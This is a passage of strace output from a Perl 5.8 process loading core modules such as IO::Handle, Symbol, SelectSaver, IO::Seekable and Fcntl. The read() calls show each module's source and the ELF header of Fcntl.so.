=~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
7444  07:18:47.737359 stat64("/etc/perl/Symbol.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737380 stat64("/etc/perl/Symbol.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737394 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737407 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737420 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737432 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737446 stat64("/usr/lib/perl5/Symbol.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737457 stat64("/usr/lib/perl5/Symbol.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737470 stat64("/usr/share/perl5/Symbol.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737482 stat64("/usr/share/perl5/Symbol.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737495 stat64("/usr/lib/perl/5.8/Symbol.pmc",  <unfinished ...>
7442  07:18:47.737511 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
7444  07:18:47.737520 <... stat64 resumed> 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737526 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.737540 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7442  07:18:47.737551 <... rt_sigprocmask resumed> NULL, 8) = 0
7442  07:18:47.737568 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
7444  07:18:47.737576 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
7444  07:18:47.737596 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.737610 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.737621 _llseek(8, 0, [0], SEEK_CUR) = 0
7442  07:18:47.737631 <... rt_sigprocmask resumed> [], 8) = 0
7444  07:18:47.737646 read(8,  <unfinished ...>
7442  07:18:47.737655 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7442  07:18:47.737666 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
7442  07:18:47.737679 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
7444  07:18:47.737692 <... read resumed> "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
7442  07:18:47.737909 waitpid(-1,  <unfinished ...>
7444  07:18:47.738184 read(8, "", 4096) = 0
7444  07:18:47.738200 close(8)          = 0
7444  07:18:47.738275 stat64("/etc/perl/SelectSaver.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738333 stat64("/etc/perl/SelectSaver.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738348 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738361 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738376 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738389 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738416 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738428 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738441 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738453 stat64("/usr/share/perl5/SelectSaver.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738466 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738479 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738493 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.738505 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
7444  07:18:47.738526 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.738541 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.738552 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.738570 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
7444  07:18:47.738694 brk(0x81d6000)    = 0x81d6000
7444  07:18:47.738724 read(8, "", 4096) = 0
7444  07:18:47.738735 close(8)          = 0
7444  07:18:47.739361 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
7444  07:18:47.740303 read(6, "", 4096) = 0
7444  07:18:47.745189 close(6)          = 0
7444  07:18:47.745190 stat64("/etc/perl/IO/Seekable.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.745190 stat64("/etc/perl/IO/Seekable.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.745190 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.745190 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.745190 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.745191 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.745191 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.745191 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.745191 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.745192 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.745192 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.745192 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
7444  07:18:47.745192 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
7444  07:18:47.745195 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d1d8) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.745207 _llseek(6, 0, [0], SEEK_CUR) = 0
7444  07:18:47.745226 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
7444  07:18:47.745414 stat64("/etc/perl/Fcntl.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.745430 stat64("/etc/perl/Fcntl.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.745443 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.745455 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.745469 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.745481 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.745495 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.745506 stat64("/usr/lib/perl5/Fcntl.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.745519 stat64("/usr/share/perl5/Fcntl.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.745530 stat64("/usr/share/perl5/Fcntl.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.745543 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.745555 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
7444  07:18:47.745575 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.745589 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.745600 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.745619 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
7444  07:18:47.746030 brk(0x81f7000)    = 0x81f7000
7444  07:18:47.746205 read(8, "", 4096) = 0
7444  07:18:47.746220 close(8)          = 0
7444  07:18:47.746998 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
7444  07:18:47.747057 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
7444  07:18:47.747096 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
7444  07:18:47.747111 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
7444  07:18:47.747204 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
7444  07:18:47.747222 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7de5000
7444  07:18:47.747235 mmap2(0xb7de8000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7de8000
7444  07:18:47.747250 close(8)          = 0
7444  07:18:47.747500 read(6, "", 4096) = 0
7444  07:18:47.747515 close(6)          = 0
